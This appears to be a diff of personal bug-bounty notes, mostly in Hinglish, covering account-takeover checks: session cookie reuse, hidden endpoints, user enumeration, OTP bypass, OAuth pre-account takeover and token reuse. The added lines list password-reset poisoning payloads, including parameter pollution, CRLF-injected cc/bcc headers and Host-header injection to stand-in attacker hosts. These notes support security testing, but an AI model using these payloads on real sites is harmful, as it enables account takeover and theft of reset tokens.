@@ -29,6 +29,9 @@ log in to acc go to the cookie editor copy the cookies and save to the clipboard
 
 now logout and use this cookie in cookie editor extension is web app is vulneabale is log in to your acc 
 
+
+session Doesnt expire on password reset change
+
 ---------------- end --------------------------
 
 -------------------  2nd methods -----------------------------
@@ -36,7 +39,7 @@ now logout and use this cookie in cookie editor extension is web app is vulneaba
 Authenticatio bypass by using js file 
 
 Js file me se hidden endpoint nikalo or acces karkne ka try karo force browsing method bolte he isse 
-
+acces control issue 
 
 ------------ Username and Email Address Enumeration -----------------  
 
@@ -50,6 +53,7 @@ register page pe jake existing user dalke dekho respone me ky milta he
 
 
 ------------- reset password link pe host header hoga token churaya ja sakta he -------- 
+
 alag alag headers dalke burp-collabrator ka link dalo http me token ayega 
 
 email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
@@ -58,7 +62,13 @@ im JSON array: {"email":["victim@mail.tld","atracker@mail.tld"]}
 
 with CLRF: /resetPassword?0a%0dHost:atracker.tld (x-host, true-client-ip, x-forwarded...)	
 
+email=victim@email.com&email=attacker@email.com
+email=victim@email.com%20email=attacker@email.com              paylaods 
+email=victim@email.com|email=attacker@email.com
+email="victim@mail.tld",email="attacker@mail.tld"
 
+email="victim@mail.tld%0a%0dcc:attacker@mail.tld"
+email="victim@mail.tld%0a%0dbcc:attacker@mail.tld"
 
 
 ---------------------------- otp bypass techniquies by rohit huatam sir ------------------- 
@@ -100,13 +110,14 @@ contact  form me 2 email dalne ka jagah tha pahale email ko activate kiya
 ek site pe email and Oauth dono he 
 attacker ne email se signup kiya and victim ne Oauth se login kiya to 
 email confirmation apne app pass ho jata he Oauth ke bajjse 
+pre account takeover bolte he 
 
 ---------------------------------------------------------------------- 
 
 --------------------- token issues ---------------- 
 search token value in search parameter check if it reflected in any request or response  
 
-use attacker  acc token if it valid boom 
+use attacker acc token if it valid boom 
 
 ------------------------- end ---------------------------
 
